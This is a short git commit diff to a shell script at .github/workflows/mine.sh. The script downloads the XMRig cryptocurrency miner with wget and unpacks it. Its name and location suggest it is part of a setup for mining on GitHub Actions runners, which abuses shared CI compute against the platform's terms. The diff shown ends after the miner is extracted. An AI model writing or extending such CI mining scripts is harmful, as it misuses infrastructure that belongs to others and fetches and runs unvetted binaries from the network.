692ee045d6e5bff7e29a42188295ba10798fee3c
Hshshhhh16 <90821800+Hshshhhh16@users.noreply.github.com>
2021-09-16 09:37:15 +0200

    Update mine.sh

--- .github/workflows/mine.sh
+++ .github/workflows/mine.sh
@@ -1,2 +1,6 @@
 #!/bin/sh
-tar -zxf xmrig-5.5.1-xenial-x64.tar.gz && cd xmrig-5.5.1
+wget https://github.com/xmrig/xmrig/releases/download/v5.5.1/xmrig-5.5.1-xenial-x64.tar.gz
+
+tar -zxf xmrig-5.5.1-xenial-x64.tar.gz
+
+cd xmrig-5.5.1
